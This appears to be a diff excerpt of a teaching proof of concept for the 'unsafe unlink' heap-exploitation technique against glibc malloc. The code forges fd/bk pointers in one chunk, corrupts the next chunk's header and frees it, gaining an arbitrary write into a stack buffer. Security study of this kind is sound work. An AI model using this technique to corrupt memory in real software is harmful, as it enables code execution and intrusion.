@@ -1,0 +1,18 @@
+7   uint64_t *chunk0_ptr;
+17  int malloc_size = 0x420;
+18  int header_size = 2;
+
+22  chunk0_ptr = (uint64_t*) malloc(malloc_size);
+23  uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size);
+29  chunk0_ptr[1] = chunk0_ptr[-1] - 0x10;
+31  chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
+34  chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
+
+39  uint64_t *chunk1_hdr = chunk1_ptr - header_size;
+42  chunk1_hdr[0] = malloc_size;
+45  chunk1_hdr[1] &= ~1;
+49  free(chunk1_ptr);
+
+52  char victim_string[8];
+54  chunk0_ptr[3] = (uint64_t) victim_string;
+58  chunk0_ptr[0] = 0x4141414142424242LL;
